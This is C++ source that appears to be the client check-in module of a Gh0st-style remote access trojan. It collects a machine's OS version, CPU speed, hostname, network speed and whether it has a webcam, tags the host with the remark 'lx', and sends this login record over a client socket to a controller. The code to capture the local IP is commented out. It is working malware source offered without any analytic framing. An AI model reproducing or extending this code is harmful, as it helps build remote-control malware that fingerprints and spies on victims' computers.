#include <wininet.h>
#include <vfw.h>

#include "until.h"

//#pragma warning(disable: 4800)

typedef struct lxLOGININFO
{
	BYTE			bToken;			// = 1
	OSVERSIONINFOEX	OsVerInfoEx;	// 版本信息
	int				CPUClockMhz;	// CPU主频
	IN_ADDR			IPAddress;		// 存储32位的IPv4的地址数据结构
	TCHAR			HostName[50];	// 主机名
	TCHAR			HostReMark[50];	// 备注
	bool			bIsWebCam;		// 是否有摄像头
	DWORD			dwSpeed;		// 网速
}LOGININFO;

// Get System Information
DWORD CPUClockMhz()
{
	HKEY	hKey;
	DWORD	dwCPUMhz;
	DWORD	dwBytes = sizeof(DWORD);
	DWORD	dwType = REG_DWORD;

	RegOpenKey(HKEY_LOCAL_MACHINE, _T("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0"), &hKey);
	RegQueryValueEx(hKey, _T("~MHz"), NULL, &dwType, (PBYTE)&dwCPUMhz, &dwBytes);

	RegCloseKey(hKey);

	return	dwCPUMhz;
}

bool IsWebCam()
{
	bool bRet = false;
	HINSTANCE avicap32 = LoadLibraryW(L"avicap32.dll");
	typedef bool (WINAPI *GETDRIVER)(UINT, LPTSTR, INT, LPTSTR, INT);
#ifdef _UNICODE
	GETDRIVER mycapGetDriverDescription = (GETDRIVER)GetProcAddress(avicap32, "capGetDriverDescriptionW");
#else
	GETDRIVER mycapGetDriverDescription = (GETDRIVER)GetProcAddress(avicap32, "capGetDriverDescriptionA");
#endif

	TCHAR lpszName[100], lpszVer[50];
	for (int i = 0; i < 10 && !bRet; i++)
	{
		bRet = mycapGetDriverDescription(i, lpszName, sizeof(lpszName), lpszVer, sizeof(lpszVer));
	}
	if (avicap32)
		FreeLibrary(avicap32);
	return bRet;
}

int sendLoginInfo(LPCTSTR strServiceName, CClientSocket *pClient, DWORD dwSpeed)
{
	int nRet = SOCKET_ERROR;

	LOGININFO LoginInfo;
	// 开始构造数据
	LoginInfo.bToken = TOKEN_LOGIN; // 令牌为登录
	LoginInfo.OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((OSVERSIONINFO *)&LoginInfo.OsVerInfoEx); // 注意转换类型

	// 主机名
	TCHAR hostname[128] = _T("");

#ifdef UNICODE
	char hostn[128] = "";
	gethostname(hostn, 128);
	int nwlen = MultiByteToWideChar(CP_ACP, 0, hostn, lstrlenA(hostn), NULL, 0);
	MultiByteToWideChar(CP_ACP, 0, hostn, lstrlenA(hostn), hostname, nwlen);
#else
	gethostname(hostname,128);
#endif

	// 连接的IP地址
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	//mygetsockname(pClient->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);

	memcpy(&LoginInfo.IPAddress, (void *)&sockAddr.sin_addr, sizeof(IN_ADDR));
	lstrcpy(LoginInfo.HostName, hostname);   //主机名
	lstrcpy(LoginInfo.HostReMark, _T("lx"));  //remark
	// CPU
	LoginInfo.CPUClockMhz = CPUClockMhz();
	LoginInfo.bIsWebCam = IsWebCam();

	// Speed
	LoginInfo.dwSpeed = dwSpeed;

	nRet = pClient->Send((LPBYTE)&LoginInfo, sizeof(LOGININFO));

	return nRet;
}
